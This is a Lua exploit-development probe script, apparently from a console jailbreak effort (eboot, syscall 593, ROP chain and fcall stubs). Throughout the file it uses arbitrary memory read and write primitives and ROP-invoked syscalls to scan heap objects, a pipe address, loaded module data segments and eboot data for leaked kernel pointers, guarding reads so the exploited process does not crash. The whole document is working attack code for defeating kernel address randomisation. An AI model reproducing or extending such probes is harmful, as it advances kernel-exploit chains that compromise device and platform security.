-- CRASH_CLASS: MODERATE
-- PROBE 119f: Safe pipe/fn_addr read with pcall protection
--
-- 119e crashed reading pipe address. This probe:
-- A: Read fn_addr heap object (known to be in readable heap)
-- B: Try pipe address via pcall (won't crash process)
-- C: Scan other modules data segments for kptrs
-- D: Finish eboot data scan (0x80000-0x180000)

print("=== PROBE 119f: SAFE PIPE READ ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h<0xFFFFF000 and h~=0xFFFFFFFF
end
local function read_base(inf_addr, off)
    local lo=rd(inf_addr+off) or 0; local hi=rd(inf_addr+off+4) or 0
    if hi<0 then hi=hi+0x100000000 end
    if lo<0 then lo=lo+0x100000000 end
    if hi==0 and lo==0 then return nil end
    return N(uint64(string.format("0x%X%08X", hi, lo)))
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

-- ============================================================
print("--- A: fn_addr HEAP OBJECT ---")
local pipe_str=tostring(syscall.pipe)
local fn_str=pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local addr_str=pipe_str:match("address @ (0x[0-9a-fA-F]+)")
local rop_str=pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
print("fn="..tostring(fn_str).." addr="..tostring(addr_str).." rop="..tostring(rop_str))

-- Read fn_addr object (in heap, should be safe)
if fn_str then
    local FA=tonumber(fn_str)
    if FA then
        local fkp=0
        for off=0,0x78,8 do
            local val=rq(FA+off)
            local tag=""
            if val and is_kptr(val) then fkp=fkp+1; tag=" *K*" end
            if val then
                print(string.format("  fn+%02X:%s%s", off, fmt(val), tag))
            else
                print(string.format("  fn+%02X:UNREADABLE", off))
            end
        end
        print("fn_kp="..fkp)
    end
end

-- Read ropchain object
if rop_str then
    local RA=tonumber(rop_str)
    if RA then
        local rkp=0
        for off=0,0x78,8 do
            local val=rq(RA+off)
            local tag=""
            if val and is_kptr(val) then rkp=rkp+1; tag=" *K*" end
            if val then
                print(string.format("  rop+%02X:%s%s", off, fmt(val), tag))
            else
                print(string.format("  rop+%02X:UNREADABLE", off))
            end
        end
        print("rop_kp="..rkp)
    end
end

local c=N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- B: PIPE ADDR (pcall protected) ---")
-- The pipe address kills the process when read directly.
-- It goes through pcall so if it fails we survive.
if addr_str then
    local PA=tonumber(addr_str)
    if PA then
        -- Try aligned version first
        local aligned = PA - (PA % 8)
        print(string.format("raw=0x%X aligned=0x%X", PA, aligned))
        local ok1,v1 = pcall(function() return memory.read_dword(aligned) end)
        if ok1 and v1 then
            print("aligned_rd OK: "..string.format("0x%X", N(v1)))
        else
            print("aligned_rd FAIL")
        end
        -- Try page base
        local page = PA - (PA % 0x4000)
        local ok2,v2 = pcall(function() return memory.read_dword(page) end)
        if ok2 and v2 then
            print("page_rd OK: "..string.format("0x%X", N(v2)))
        else
            print("page_rd FAIL")
        end
    end
end

c=N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED after pipe!") return end

-- ============================================================
print("")
print("--- C: OTHER MODULES ---")
local sc_info=mk(593)
for handle=3,39 do
    local inf=memory.alloc(0x200)
    wd(inf,0x160)
    local ok2=pcall(function() sc_info(uint64(handle),inf) end)
    if not ok2 then break end
    local I2=N(inf)
    local tb2=read_base(I2,0x108)
    if not tb2 then
        if handle>10 then break end
    else
        local db2=read_base(I2,0x118)
        local name=""
        for i=0,23 do
            local b=rd(I2+8+i); if not b then break end
            local ch=b%256; if ch==0 then break end
            if ch>=32 and ch<127 then name=name..string.char(ch) end
        end
        if db2 then
            local dsz2_raw=rq(I2+0x120)
            local dsz2=0
            if dsz2_raw then
                local _,dl=get_hi_lo(dsz2_raw)
                if dl<0 then dl=dl+0x100000000 end
                dsz2=dl
            end
            local mkp=0
            local limit=math.min(dsz2,0x20000)
            for off=0,limit-8,8 do
                local val=rq(db2+off)
                if val==nil then break end
                if is_kptr(val) then mkp=mkp+1 end
            end
            print(string.format("[%d]'%s' d=0x%X sz=0x%X kp=%d", handle, name, db2, dsz2, mkp))
        else
            print(string.format("[%d]'%s' t=0x%X NO_DATA", handle, name, tb2))
        end
    end
end

-- ============================================================
print("")
print("--- D: EBOOT DATA REST ---")
local inf0=memory.alloc(0x200)
wd(inf0,0x160)
pcall(function() sc_info(uint64(0),inf0) end)
local I0=N(inf0)
local EB_DB=read_base(I0,0x118)
if EB_DB then
    local ekp=0
    for off=0x80000,0x180000-8,8 do
        local val=rq(EB_DB+off)
        if val==nil then
            print(string.format("unreadable at +0x%X", off))
            break
        end
        if is_kptr(val) then
            ekp=ekp+1
            print(string.format("  eb+0x%05X:%s", off, fmt(val)))
            if ekp>=5 then break end
        end
    end
    print("eboot_rest_kp="..ekp)
else
    print("no eboot data base")
end

-- ============================================================
print("")
c=N(native.fcall_with_rax(stub,20))
print(string.format("DONE canary=%s", c==pid and "OK" or "FAIL"))
print("=== 119f COMPLETE ===")
